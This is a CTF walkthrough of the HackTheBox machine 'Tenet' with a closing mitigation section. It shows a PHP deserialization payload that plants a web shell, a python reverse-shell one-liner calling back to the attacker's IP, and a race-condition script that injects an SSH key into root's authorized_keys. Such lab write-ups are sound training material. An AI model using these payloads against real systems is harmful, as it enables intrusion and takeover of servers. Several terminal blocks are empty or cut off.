## **Description:**

[Tenet](https://www.hackthebox.com/machines/tenet) from [HackTheBox](https://www.hackthebox.com) has a php file running on the web server vulnerable to `Insecure Deserialization` which allowed us to write a web shell to the server and get a reverse shell. We find a clear text password on one of the config files and use it to ssh as user `neil`. The user is able to run a shell script as root which is vulnerable to a `race condition`, we exploit that to become root.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.223
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

|_http-title: Apache2 Ubuntu Default Page: It works

```

We found two ports, 22 running `ssh` and 80 running an `Apache` web server.

### Web

Let's navigate to the web page.

![page](1.png)

It's the Apache's default page.

#### Feroxbuster

Let's run a directory scan.

```terminal

```

We found `/wordpress`, let's check it out.

![wordpress](2.png)

The page is not loading correctly, maybe this is because their is a hostname.

![hostname](3.png)

We found the hostname `tenet.htb`, let's add it to `/etc/hosts` file and update the page.

![newpage](4.png)

Just going to the website's root it shows us the wordpress file.

#### WPScan

One famous scanner we can use to scan `wordpress` is `wpscan`.

Let's enumerate for users and vulnerable plugins using the following command:

```bash
wpscan --url http://tenet.htb/ -e u,p 
```

The output is as follows:

No vulnerable plugins were found but there two users `protagonist` and `neil`.

Let's go back to the web page and see if we can find any interesting information.

![sator](5.png)

On the Migration post we find a comment from `neil` talking about a php file called `sator` and some backup.

There might be a file on the server named `sator.php`. Searching for it on `tenet.htb` didn't give us anything, but it worked on `10.10.10.223`.

![sator file](6.png)

It shows us some text but we don't know what it means.

Since `neil` also mentioned a backup, maybe there is a `.bak` file of `sator.php`. Searching for `sator.php.bak` downloads the file successfully.

```php
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

This code seems to be using `__destruct()` function to create a file called users.txt and writing the value of `data` to it.

![users](7.png)

The file does exist with the content `Success`.

One interesting lines here are:

```php
$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
```

The php file is expecting a GET parameter with the name `arepo` and passes the value to `unserialize`.

For more information about `php deserialization` check this video from `IppSec`

{% include embed/youtube.html id='HaW15aMzBUM' %}

## **Foothold**

To exploit this we need to generate a serialized object, the following php code does the job.

```php
<?php

class DatabaseExport {

    public $user_file = "0xsirius.php";
    public $data = '<?php system($_GET["cmd"]); ?>';

}

$exploit = new DatabaseExport;
echo serialize($exploit);

?>
```

This will write a php web shell `<?php system($_GET["cmd"]); ?>` to the file `0xsirius.php` and will allow us to run system commands.

Let's execute the file with `php exploit.php`

```terminal
$ php exploit.php 

O:14:"DatabaseExport":2:{s:9:"user_file";s:12:"0xsirius.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

We submit the serialized object to `arepo`

```url
http://10.10.10.223/sator.php?arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:12:"0xsirius.php";s:4:"data";s:30:"<?php system($_GET["cmd"]); ?>";}
```

![deserialization](8.png)

Now if we go to `10.10.10.223/0xsirius.php?cmd=id` we should get command execution.

![id](9.png)

Now let's get a reverse shell.

First we setup a listener with `nc -lvnp 9001` and run the following command on the web shell:

```bash
export RHOST="10.10.16.4";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![shell](10.png)

## **Privilege Escalation**

### www-data -> neil

Let's check `wp-config.php` since it's the one containing wordpress database credentials.

```terminal
www-data@tenet:/var/www/html$ ls 
0xsirius.php  index.html  sator.php.bak  wordpress
hack.php      sator.php   users.txt

We found `neil`'s password, let's try ssh to him.

```terminal
$ ssh neil@tenet.htb

### neil -> root

Let's check our privileges as `neil`.

```terminal
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

We can run the following bash script:

```bash
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded

```

This script contains three functions:

The `addKey` functions creates a temporary file in `/tmp` that starts with `ssh-`, it then gives the file 110 permission using `umask` which is `rw-rw-rw-`. After that it writes the public key to the temporary file which is then used to add the key to `authorized_keys`

The `checkFile` function checks if the temporary file already exists in `/tmp`.

`checkAdded` checks if `root`'s public key is in `authorized_keys` file.

To exploit this we need to write a script that runs in a loop checking the `/tmp` for a file that starts with `ssh-`, if it finds it we tell it to write our public key to the file so it could then be added to `root`'s authorized_key file.

First we generate a pair of ssh keys using the following command:

```bash
ssh-keygen -f id_rsa
```

The content of `.pub` file is our public key.

The script to exploit this race condition is the following:

```bash
while true; do
    for file in /tmp/ssh-*; do
        echo "ssh-rsa AAAAB3N1Txxxxxxxxxxxxxxxxxxxxxx11pJx84kV sirius@kali" > $file
    done
done
```

Put your public key in the script and let's get root.

We first run the script, get another session as `neil` and run the sudo command:

![root](11.png)

Since this is a race condition, we need to keep running the script until we get the error:

```bash
Error in adding root@ubuntu to authorized_keys file!
```

This indicates that our key have been successfully writen in the `authorized_keys` and we can proceed to connect as root.

## **Prevention and Mitigation**

### Neil

`Neil` revealed to much information like the name of the php file and the backup.

Sensitive information like that should be kept private between the developers and any conversation between them should take place in a safe space.

### PHP unserialize

There is an insecure deserialization in `sator.php` because user input is submitted directly to the `unserialize` function.

Do not use unserialize() function with user-supplied input, use JSON functions instead.

### sudo

The script we run as root writes ssh public key using `mktemp` with the -u arguments which is marked unsafe on the man page, it also used `umask` to make it writable by everyone.

The script could have been way simpler but since this is a CTF it is what it is. Removing write permission from the temporary file and place it in a safer place should prevent us from writing it.
